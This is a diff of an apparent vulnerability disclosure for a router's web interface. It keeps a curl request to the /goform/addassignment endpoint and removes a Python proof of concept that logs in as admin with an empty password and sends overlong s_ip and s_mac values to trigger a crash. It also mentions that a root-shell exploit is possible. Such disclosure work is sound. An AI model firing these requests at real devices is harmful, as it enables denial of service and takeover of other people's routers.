@@ -33,44 +33,5 @@ curl -i -X POST http://192.168.0.1/goform/addassignment -d tokenid=xxxx -d 's_ip
 
 The picture above shows the poc effect
 
-```python
-import requests
-
-li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
-ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
-
-tokenid = '1681692777'
-
-url = 'http://192.168.0.1/goform/formLogin'
-
-data = {
-    'tokenid' : tokenid,
-    'username' : 'QWRtaW4=',
-    'password' : '',
-    'Language' : 'Chinese',
-    'submit.htm?login.htm' : 'Send'
-}
-response = requests.post(url, data=data)
-response.encoding="utf-8"
-info = response.text
-li(url)
-print(info)
-
-
-url = 'http://192.168.0.1/goform/addassignment'
-
-data = {
-    'tokenid' : tokenid,
-    's_ip' : 'a' * 0x400,
-    's_mac' : 'a' * 0x400
-}
-response = requests.post(url, data=data)
-response.encoding="utf-8"
-info = response.text
-li(url)
-print(info)
-```
-
-Of course, you can write a python script for verification, just replace the above tokenid
 
 Finally, you can write exp to achieve the effect of stable access to the root shell
